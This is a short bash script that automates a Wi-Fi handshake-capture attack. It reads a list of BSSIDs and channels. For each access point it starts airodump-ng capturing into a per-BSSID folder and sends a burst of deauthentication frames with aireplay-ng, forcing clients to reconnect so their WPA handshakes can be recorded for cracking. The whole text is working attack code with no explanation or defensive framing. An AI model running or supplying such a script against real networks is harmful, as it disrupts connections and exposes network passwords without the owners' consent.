#!/bin/bash


main(){
  rm -rf shakes
	airmon-ng check kill
	#airmon-ng start wlan0mon
	#ip link set wlan0mon down
	#iw wlan0mon set monitor control
	#ip link set wlan0mon up

	mkdir shakes
	while read line
	do

		channel=`echo $line | awk '{print $2}'`
		bssid=`echo $line | awk '{print $1}'`
		#iwconfig wlan0mon channel $channel
		mkdir shakes/$bssid
		echo $bssid
		echo $channel
		
		airodump-ng --bssid $bssid  -w /home/kali/shakes/$bssid/$bssid wlan0mon < /dev/null > /dev/null &  
		aireplay-ng  -a $bssid -0 10 wlan0mon
		kill $!
		#-w /home/kali/shakes/$bssid/$bssid wlan0mon > /dev/null & sleep 5; kill $! 
	done < $1
}


main $1
